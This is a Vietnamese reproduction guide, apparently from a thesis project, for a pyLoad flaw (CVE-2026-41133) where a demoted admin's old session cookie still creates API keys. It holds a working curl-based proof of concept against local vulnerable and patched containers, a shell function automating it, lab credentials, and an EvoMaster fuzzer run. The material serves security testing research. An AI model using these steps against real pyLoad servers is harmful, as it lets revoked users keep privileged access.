# Tái hiện lỗi trên Tier-2b pyLoad (CVE-2026-41133)

Cờ và cú pháp lệnh: `cli.md`. Output chạy thật ngày 2026-10-19.

## 1. Lỗi

alice là ADMIN và đăng nhập, nhận cookie phiên. superadmin hạ alice xuống USER. Trên bản lỗi, cookie cũ của alice vẫn
tạo được API key, một thao tác chỉ ADMIN làm được. Bản vá trả 403.

Lỗi là của pyLoad, không do ta gieo. `parse_permissions()` ở `pyload/webui/app/helpers.py:134–143` (trong container:
`/usr/local/lib/python3.11/site-packages/pyload/`) đọc vai trò từ `session.get("role")`, bản sao lưu vào phiên Flask lúc
đăng nhập. Bản lỗi giữ nguyên file này của upstream.

Phần của ta, chi tiết trong `docs/tier2b-pyload-target.md` §3:

- Bản vá: upstream chưa có bản vá chạy được, nên ta viết. Nó đọc lại vai trò trong DB ở mỗi request
  (`infra/pyload-cve/patch_pyload.py`, sửa `rolecheck`).
- Tắt CSRF ở cả hai bản để client không phải trình duyệt gọi được.
- Endpoint reset `/thesis/reset` thêm vào cả hai bản.
- Spec OpenAPI cho `/json/*` viết tay.

## 2. Target

| | Bản lỗi | Bản vá |
|---|---|---|
| Container | `pyload-vuln` | `pyload-fixed` |
| Cổng | 8090 | 8091 |
| Spec | `infra/pyload-cve/openapi-merged.json` | như bản lỗi |
| Reset | `POST /thesis/reset` | `POST /thesis/reset` |

| Tài khoản | Mật khẩu | Vai trò | Dùng làm |
|---|---|---|---|
| `alice` | `alicepass` | ADMIN | nạn nhân bị hạ |
| `superadmin` | `superpass` | ADMIN | người hạ |
| `pyload` | `pyload` | ADMIN | tài khoản mặc định của pyLoad |

Trong DB, `role` 0 là ADMIN, 1 là USER.

| Method | Path | Thân | Ai được gọi |
|---|---|---|---|
| `POST` | `/login` | form `username=…&password=…` | ai cũng được; trả `302` và cookie `pyload_session_8000` |
| `POST` | `/json/generate_apikey` | JSON `{"user","password","name","expires"}` | ADMIN; mỗi lần tạo một key mới nên gọi lại được |
| `POST` | `/json/update_users` | JSON `{"update_data": {"<tên>\|admin": true, ...}}` | ADMIN; admin không có tên trong danh sách bị hạ xuống USER |
| `POST` | `/thesis/reset` | | ai cũng được |

## 3. Từng bước

Đổi `8090` thành `8091` và `pyload-vuln` thành `pyload-fixed` để chạy bản vá.

```
H=http://localhost:8090
C=pyload-vuln
J='Content-Type: application/json'
D=$(mktemp -d)
```

`$D` là thư mục tạm chứa file cookie.

**Bước 1. Reset và xem vai trò.**

```
curl -s -XPOST $H/thesis/reset
docker exec $C python -c "import sqlite3; print(sqlite3.connect('/data/data/pyload.db').execute('SELECT name, role, permission FROM users').fetchall())"
```

```
true
[('pyload', 0, 0), ('alice', 0, 0), ('superadmin', 0, 0)]
```

**Bước 2. alice và superadmin đăng nhập, lưu cookie.**

```
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' -c $D/old.txt -XPOST $H/login -d 'username=alice&password=alicepass'
curl -s -o /dev/null -c $D/adm.txt -XPOST $H/login -d 'username=superadmin&password=superpass'
```

```
302 http://localhost:8090/dashboard
```

`$D/old.txt` là cookie cũ của alice. Không ghi đè file này.

**Bước 3. Source: alice tạo API key bằng cookie cũ.**

```
curl -s -w '\n%{http_code}\n' -b $D/old.txt -XPOST $H/json/generate_apikey -H "$J" -d '{"user":"alice","password":"alicepass","name":"before","expires":null}'
```

```
{"success": true, "data": {"key": "pl_13qU…", "key_id": 3, "expires_at": 0, …}}
200
```

**Bước 4. Transition: superadmin giữ quyền admin cho superadmin và pyload, nên alice bị hạ.**

```
curl -s -w '\n%{http_code}\n' -b $D/adm.txt -XPOST $H/json/update_users -H "$J" -d '{"update_data": {"superadmin|admin": true, "pyload|admin": true}}'
docker exec $C python -c "import sqlite3; print(sqlite3.connect('/data/data/pyload.db').execute('SELECT name, role, permission FROM users').fetchall())"
```

```
true
200
[('pyload', 0, 0), ('alice', 1, 0), ('superadmin', 0, 0)]
```

Lệnh thứ hai xác nhận alice đã là `role` 1 trong DB.

**Bước 5. Follow-up: cookie cũ của alice tạo API key lần nữa.**

```
curl -s -w '\n%{http_code}\n' -b $D/old.txt -XPOST $H/json/generate_apikey -H "$J" -d '{"user":"alice","password":"alicepass","name":"after","expires":null}'
```

| 8090 bản lỗi | 8091 bản vá |
|---|---|
| `{"success": true, "data": {"key": "pl_14ty…", "key_id": 4, …}}` `200` (lỗi) | `Forbidden` `403` |

**Bước 6. Đối chứng: alice đăng nhập lại vào file cookie khác, gửi đúng lời gọi ở bước 5.**

```
curl -s -o /dev/null -c $D/new.txt -XPOST $H/login -d 'username=alice&password=alicepass'
curl -s -w '\n%{http_code}\n' -b $D/new.txt -XPOST $H/json/generate_apikey -H "$J" -d '{"user":"alice","password":"alicepass","name":"new","expires":null}'
```

Cả hai bản trả:

```
Forbidden
403
```

**Bước 7. Reset và xoá cookie.**

```
curl -s -XPOST $H/thesis/reset
rm -rf $D
```

Trên 8090, bước 3–6 khớp đủ bốn điều kiện nổ 970 của jar P2f.

## 4. Script có sẵn

`infra/pyload-cve/verify_ground_truth.sh` chạy bước 2–5 trên cả hai bản và kiểm vai trò trong DB:

```
bash infra/pyload-cve/verify_ground_truth.sh
```

```
                       source / transition / follow-up
VULNERABLE (:8090)     200 / 200 / 200   (alice role after transition: 1)
FIXED      (:8091)     200 / 200 / 403   (alice role after transition: 1)

expected: VULNERABLE 200/200/200 (bug)   FIXED 200/200/403 (control)
alice role must be 1 (USER) in both, or the transition did not take effect.
```

Script reset bằng `seed_users.py` qua `docker exec`, không qua `/thesis/reset`, và không reset sau khi chạy. Chạy
`curl -s -XPOST localhost:8090/thesis/reset` và `curl -s -XPOST localhost:8091/thesis/reset` sau đó.

## 5. Một lệnh

Dán vào terminal một lần, rồi gọi `a1p 8090` hoặc `a1p 8091`. Hàm tự reset trước và sau.

```
a1p() {
  local H=http://localhost:${1:-8090}
  local J='Content-Type: application/json'
  local D=$(mktemp -d)
  curl -s -o /dev/null -XPOST $H/thesis/reset
  curl -s -o /dev/null -c $D/old.txt -XPOST $H/login -d 'username=alice&password=alicepass'
  curl -s -o /dev/null -c $D/adm.txt -XPOST $H/login -d 'username=superadmin&password=superpass'
  local s=$(curl -s -o /dev/null -w '%{http_code}' -b $D/old.txt -XPOST $H/json/generate_apikey -H "$J" -d '{"user":"alice","password":"alicepass","name":"before","expires":null}')
  local t=$(curl -s -o /dev/null -w '%{http_code}' -b $D/adm.txt -XPOST $H/json/update_users -H "$J" -d '{"update_data": {"superadmin|admin": true, "pyload|admin": true}}')
  local o=$(curl -s -o /dev/null -w '%{http_code}' -b $D/old.txt -XPOST $H/json/generate_apikey -H "$J" -d '{"user":"alice","password":"alicepass","name":"after","expires":null}')
  curl -s -o /dev/null -c $D/new.txt -XPOST $H/login -d 'username=alice&password=alicepass'
  local n=$(curl -s -o /dev/null -w '%{http_code}' -b $D/new.txt -XPOST $H/json/generate_apikey -H "$J" -d '{"user":"alice","password":"alicepass","name":"new","expires":null}')
  curl -s -o /dev/null -XPOST $H/thesis/reset
  rm -rf $D
  echo "source      alice cookie cũ   POST /json/generate_apikey  $s"
  echo "transition  superadmin        POST /json/update_users     $t"
  echo "follow-up   alice cookie cũ   POST /json/generate_apikey  $o"
  echo "đối chứng   alice cookie mới  POST /json/generate_apikey  $n"
  if [[ $s == 2* && $t == 2* && $o == 2* && $n == 403 ]]; then
    echo "MR-A1 bị vi phạm: cookie cũ vẫn tạo được API key sau khi alice bị hạ"
  else
    echo "MR-A1 giữ: cookie cũ không còn quyền ghi"
  fi
}
```

`a1p 8090`:

```
source      alice cookie cũ   POST /json/generate_apikey  200
transition  superadmin        POST /json/update_users     200
follow-up   alice cookie cũ   POST /json/generate_apikey  200
đối chứng   alice cookie mới  POST /json/generate_apikey  403
MR-A1 bị vi phạm: cookie cũ vẫn tạo được API key sau khi alice bị hạ
```

`a1p 8091`:

```
source      alice cookie cũ   POST /json/generate_apikey  200
transition  superadmin        POST /json/update_users     200
follow-up   alice cookie cũ   POST /json/generate_apikey  403
đối chứng   alice cookie mới  POST /json/generate_apikey  403
MR-A1 giữ: cookie cũ không còn quyền ghi
```

## 6. Mã trạng thái của app

| Mã | Khi nào | Ví dụ thật trên 8090 |
|---|---|---|
| `302` | gọi `/json/*` không có cookie | chuyển tới `http://localhost:8090/login?next=generate_apikey` |
| `403` | có phiên, thiếu quyền (`helpers.py:276`, `:283`) | thân `Forbidden` |
| `401` | `/api/*` từ chối (`api_blueprint.py:51`, theo `docs/tier2b-pyload-target.md` §4) | |

Theo `CLAUDE.md` §3, 302 và 401 không là DENIED. Bộ ba trên pyLoad dùng `/json/*` vì mặt này từ chối bằng 403.

## 7. Sự cố

| Triệu chứng | Nguyên nhân | Cách xử lý |
|---|---|---|
| `000` | container dừng | `docker start pyload-vuln pyload-fixed` |
| bước 3 ra `302` | file cookie trống hoặc sai đường dẫn | kiểm `$D/old.txt` có dòng `pyload_session_8000` |
| bước 3 ra `403` | lần trước chưa reset, alice vẫn là USER | chạy lại bước 1 và 2 |
| bước 5 trên 8090 ra `403` | `$D/old.txt` bị ghi đè bằng lần đăng nhập sau bước 4 | đăng nhập lại ở bước 6 vào file khác |

## 8. Chạy EvoMaster

Giống hàm `t2b` trong `infra/em-results/p2f-full-20261015/p2f_full.sh`. Cờ: `cli.md` §7.

```
curl -s -o /dev/null -XPOST http://localhost:8090/thesis/reset
JAVA_HOME=$(/usr/libexec/java_home -v 17) java -jar /Users/minhnguyen/IdeaProjects/EvoMaster/evomaster-P2f-64ee8ffc.jar \
  --blackBox true \
  --bbSwaggerUrl file:///Users/minhnguyen/IdeaProjects/graduational-thesis/infra/pyload-cve/openapi-merged.json \
  --bbTargetUrl http://localhost:8090 \
  --configPath infra/em-config/pyload-auth.yaml \
  --endpointExclude "/api/kill,/api/restart" \
  --useExperimentalOracles true --extraPhaseBudgetPercentage 0.6 \
  --outputFormat PYTHON_UNITTEST --ratePerMinute 200 --maxTime 10m --seed 1 \
  --outputFolder infra/em-results/<thư-mục-mới>/t2b-vuln-seed1
```

Arm có reset, chỉ chạy được trên P2f và các jar trước, thêm
`--statefulAuthzResetEndpoint "POST http://localhost:8090/thesis/reset"`. Bỏ `--endpointExclude` thì
EvoMaster gọi `/api/kill` và tắt app trong phút đầu.
